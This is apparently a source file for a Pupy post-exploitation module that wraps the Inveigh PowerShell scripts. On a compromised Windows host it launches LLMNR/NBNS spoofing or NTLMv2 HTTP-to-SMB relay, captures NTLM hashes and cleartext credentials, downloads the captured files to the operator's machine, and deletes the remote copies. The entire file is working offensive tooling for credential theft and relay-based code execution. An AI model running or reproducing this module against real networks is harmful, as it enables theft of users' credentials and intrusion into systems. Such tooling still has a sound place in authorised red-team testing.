# -*- coding: UTF8 -*-
#Author: @bobsecq
#Contributor(s):

#Use these followings scripts:
# - https://github.com/Kevin-Robertson/Inveigh/blob/master/Scripts/Inveigh-Unprivileged.ps1
# - https://github.com/Kevin-Robertson/Inveigh/blob/master/Scripts/Inveigh.ps1
# - https://github.com/Kevin-Robertson/Inveigh/blob/master/Scripts/Inveigh-Relay.ps1
# Thank you very much @Kevin-Robertson (https://github.com/Kevin-Robertson) for this very good project!

from pupylib.PupyModule import *
from modules.lib.windows.powershell_upload import execute_powershell_script
from rpyc.utils.classic import download
import os, ntpath

__class_name__="Inveigh"
ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),".."))

@config(compat="windows", category="privesc")
class Inveigh(PupyModule):
    """ 
        execute Inveigh commands
    """
    DEFAULT_REMOTE_FOLDER = "%TMP%"
    LOG_OUT_FILE = "Inveigh-Log.txt"
    NTLMV1_OUT_FILE = "Inveigh-NTLMv1.txt"
    NTLMV2_OUT_FILE = "Inveigh-NTLMv2.txt"
    CLEARTEXT_OUT_FILE = "Inveigh-Cleartext.txt"
    
    max_clients=1
    
    def init_argparse(self):
        
        commands_available = '''
Information about start, start-unprivileged and start-relay:

- 'start' command:
    Invoke 'Invoke-Inveigh' function of Inveigh.ps1.
    According to the official documentation: 
        Invoke-Inveigh is a Windows PowerShell LLMNR/NBNS spoofer with the following features:
        -> IPv4 LLMNR/NBNS spoofer with granular control
        -> NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS/SMB
        -> Basic auth cleartext credential capture over HTTP/HTTPS
        -> WPAD server capable of hosting a basic or custom wpad.dat file
        -> HTTP/HTTPS server capable of hosting limited content

- 'start-unprivileged' command:
    Invoke 'Invoke-InveighUnprivileged' function of Inveigh-Unprivileged.ps1.
    According to the official documentation: 
        Invoke-InveighUnprivileged is a Windows PowerShell LLMNR/NBNS spoofer with the following features:
        -> Local admin is not required for any feature
        -> IPv4 NBNS spoofer with granular control that can be run with or without disabling the local NBNS service
        -> IPv4 LLMNR spoofer with granular control that can be run only with the local LLMNR service disabled
        -> Targeted IPv4 NBNS transaction ID brute force spoofer with granular control
        -> NTLMv1/NTLMv2 challenge/response capture over HTTP
        -> Basic auth cleartext credential capture over HTTP
        -> WPAD server capable of hosting a basic or custom wpad.dat file
        -> HTTP server capable of hosting limited content
        This function contains only features that do not require local admin access. Note that there are caveats. 
        A local firewall can still prevent traffic from reaching this function's listeners. Also, if LLMNR is 
        enabled on the host, the LLMNR spoofer will not work. Both of these scenarios would still require local
        admin access to change.
    
- 'start-relay' command:
    Invoke 'Invoke-InveighRelay' function of Inveigh-Relay.ps1.
    According to the official documentation: 
        Invoke-InveighRelay currently supports NTLMv2 HTTP to SMB relay with psexec style command execution.
        -> HTTP/HTTPS to SMB NTLMv2 relay with granular control
        -> NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS\n
'''
        
        self.arg_parser = PupyArgumentParser(prog="Inveigh", description=self.__doc__, epilog=commands_available)
        self.arg_parser.add_argument("-start", dest='InvokeInveigh', action='store_true', help='Invoke Windows PowerShell spoofer (local admin required)')
        self.arg_parser.add_argument("-start-unprivileged", dest='InvokeInveighUnprivileged', action='store_true', help='Invoke Windows PowerShell spoofer (local admin not required)')
        self.arg_parser.add_argument("-start-relay", dest='InvokeInveighRelay', action='store_true', help='Perform NTLMv2 HTTP to SMB relay')
        self.arg_parser.add_argument("-stop", dest='StopInveigh', action='store_true', help='Stop all instances of Inveigh')
        self.arg_parser.add_argument("-get-results", dest='getResults', action='store_true', help='Download Inveigh results')
        self.arg_parser.add_argument("-tmp-out-folder", dest='tmpOutFolder', default=self.DEFAULT_REMOTE_FOLDER, help='Define remote temp folder (default: %(default)s)')
        self.arg_parser.add_argument('-output-folder', dest='localOutputFolder', default='output', help="Folder which will contain results (default: %(default)s)")
        self.arg_parser.add_argument('-inveigh-params', dest='inveighParams', default='', help="Use Inveigh parameters (ex: -SpooferIP, -HTTP, -Inspect). See official Inveigh doc.")
        
    def printFile(self, fname):
        '''
        '''
        with open(fname, 'rb') as f:
            lines = f.read()
            print lines  
             
    def downloadInveighFiles (self, remote_temp_folder, localFolder):
        '''
        '''
        nb = 0
        if self.client.conn.modules['os.path'].isfile(self.path_log_out_file):
            out_file = os.path.join(localFolder, self.LOG_OUT_FILE)
            self.success("Downloading Inveigh log file in {0}".format(out_file))
            download(self.client.conn, self.path_log_out_file, out_file)
            self.printFile(out_file)
            nb += 1
        if self.client.conn.modules['os.path'].isfile(self.path_ntlmv1_out_file):
            out_file = os.path.join(localFolder, self.NTLMV1_OUT_FILE)
            self.success("Downloading Inveigh ntlmv1 file in {0}".format(out_file))
            download(self.client.conn, self.path_ntlmv1_out_file, out_file)
            self.printFile(out_file)
            nb += 1
        if self.client.conn.modules['os.path'].isfile(self.path_ntlmv2_out_file):
            out_file = os.path.join(localFolder, self.NTLMV2_OUT_FILE)
            self.success("Downloading Inveigh ntlmv2 file in {0}".format(out_file))
            download(self.client.conn, self.path_ntlmv2_out_file, out_file)
            self.printFile(out_file)
            nb += 1
        if self.client.conn.modules['os.path'].isfile(self.path_cleartext_out_file):
            out_file = os.path.join(localFolder, self.CLEARTEXT_OUT_FILE)
            self.success("Downloading Inveigh cleartext file in {0}".format(out_file))
            download(self.client.conn, self.path_cleartext_out_file, out_file)
            self.printFile(out_file)
            nb += 1
        return nb
            
    def removeRemoteInveighFiles(self):
        '''
        '''
        self.success("Removing remote temp files")
        if self.client.conn.modules['os.path'].isfile(self.path_log_out_file):
            logging.debug('Removing the file {0}'.format(self.path_log_out_file))
            self.client.conn.modules['os'].remove(self.path_log_out_file)
        if self.client.conn.modules['os.path'].isfile(self.path_ntlmv1_out_file):
            logging.debug('Removing the file {0}'.format(self.path_ntlmv1_out_file))
            self.client.conn.modules['os'].remove(self.path_ntlmv1_out_file)
        if self.client.conn.modules['os.path'].isfile(self.path_ntlmv2_out_file):
            logging.debug('Removing the file {0}'.format(self.path_ntlmv2_out_file))
            self.client.conn.modules['os'].remove(self.path_ntlmv2_out_file)
        if self.client.conn.modules['os.path'].isfile(self.path_cleartext_out_file):
            logging.debug('Removing the file {0}'.format(self.path_cleartext_out_file))
            self.client.conn.modules['os'].remove(self.path_cleartext_out_file)
    
    def generateAndCreateLocalFolder (self, localFolder):
        '''
        '''
        localFolder = os.path.join(localFolder, "{0}-{1}-{2}".format(self.client.desc['hostname'], self.client.desc['user'], self.client.desc['macaddr'].replace(':','')), "inveigh")
        if not os.path.exists(localFolder):
            logging.debug("Creating the {0} folder locally".format(localFolder))
            os.makedirs(localFolder)
        return localFolder
    
    def run(self, args):
        script = 'inveigh'
        pathToScript, command, remote_temp_folder = "", "", ""
        if args.tmpOutFolder == self.DEFAULT_REMOTE_FOLDER:
            remote_temp_folder = self.client.conn.modules['os.path'].expandvars("%TEMP%")
        else:
            remote_temp_folder = args.tmpOutFolder
        logging.debug('{0} used for saving real time results on the target'.format(remote_temp_folder))
        commonOptions = " -Tool 1 -FileOutput Y -OutputDir {0} ".format(remote_temp_folder)
        logging.debug("These folowing Inveigh parameters will be given by default: {0}".format(commonOptions))
        
        self.path_log_out_file = ntpath.join(remote_temp_folder, self.LOG_OUT_FILE)
        self.path_ntlmv1_out_file = ntpath.join(remote_temp_folder, self.NTLMV1_OUT_FILE)
        self.path_ntlmv2_out_file = ntpath.join(remote_temp_folder, self.NTLMV2_OUT_FILE)
        self.path_cleartext_out_file = ntpath.join(remote_temp_folder, self.CLEARTEXT_OUT_FILE)
        
        localFolder = self.generateAndCreateLocalFolder(args.localOutputFolder)
        
        if args.InvokeInveigh == False and args.InvokeInveighUnprivileged == False and args.InvokeInveighRelay == False and args.StopInveigh == False and args.getResults == False:
            self.error("You have to give a command")
            return
        
        if args.getResults == True:
            nb = self.downloadInveighFiles(remote_temp_folder, localFolder)
            if nb == 0:
                self.error("No one Inveigh result file downloaded. Is Inveigh is running on the target?")
            else:
                self.success("All Inveigh results downloaded")
            return
        elif args.InvokeInveigh == True:
            self.success("Invoke-Inveigh command selected")
            pathToScript = os.path.join(ROOT, "external", "Inveigh", "Inveigh.ps1")
            command = "Invoke-Inveigh"+commonOptions+args.inveighParams
        elif args.InvokeInveighUnprivileged == True:
            self.success("Invoke-InveighUnprivileged command selected")
            pathToScript = os.path.join(ROOT, "external", "Inveigh", "Inveigh-Unprivileged.ps1")
            command = "Invoke-InveighUnprivileged"+commonOptions+args.inveighParams
        elif args.InvokeInveighRelay == True:
            self.success("Invoke-Relay command selected")
            pathToScript = os.path.join(ROOT, "external", "Inveigh", "Inveigh-Relay.ps1")
            command = "Invoke-Relay"+commonOptions+args.inveighParams
        elif args.StopInveigh == True:
            pathToScript = os.path.join(ROOT, "external", "Inveigh", "Inveigh.ps1")
            command = "Stop-Inveigh"
        logging.debug("The following script will be loaded on the target if needed: {0}".format(pathToScript))
        for arch in ['x64', 'x86']:
            logging.debug("Powershell script actually loaded: {0}".format(self.client.powershell[arch]['scripts_loaded']))
            if script not in self.client.powershell[arch]['scripts_loaded']:
                logging.debug("Loading {0} script on target...".format(pathToScript))
                content = open(pathToScript, 'r').read()
            else:
                logging.debug("{0} script already loaded on target".format(pathToScript))
                content = ''
        logging.debug("Executing the following inveigh command: {0}".format(command))
        output = execute_powershell_script(self, content, command, x64IfPossible=True, script_name=script)
        if not output:
            self.error("No results")
            return
        self.success("Output: \n%s\n" % output)
        if args.StopInveigh == True and "exited at " in str(output):
            self.success("Inveigh is stopped")
            self.downloadInveighFiles(remote_temp_folder, localFolder)
            self.removeRemoteInveighFiles()
